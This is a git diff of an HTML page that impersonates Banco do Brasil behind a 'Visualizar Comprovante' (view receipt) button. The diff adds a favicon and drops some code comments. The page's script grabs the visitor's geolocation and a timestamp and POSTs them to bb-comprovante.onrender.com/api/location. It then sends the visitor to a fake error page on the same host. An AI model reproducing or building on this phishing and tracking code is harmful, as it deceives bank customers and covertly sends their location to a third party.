@@ -5,6 +5,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Banco do Brasil</title>
         <link rel="stylesheet" href="styles.css">
+        <link rel="icon" href="favicon.svg" type="image/x-icon">
     </head>
 <body>
     <button id="getLocation">Visualizar Comprovante</button>
@@ -20,10 +21,10 @@
                     const timestamp = date.toISOString();
 
                     // Redirecionar para o link desejado
-                    window.location.href = 'https://bb-comprovante.onrender.com/erro.html';  // Altere para o link desejado
+                    window.location.href = 'https://bb-comprovante.onrender.com/erro.html';
 
                     // Enviar dados para o backend
-                    fetch('https://bb-comprovante.onrender.com/api/location', {  // Corrigido para a rota correta
+                    fetch('https://bb-comprovante.onrender.com/api/location', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
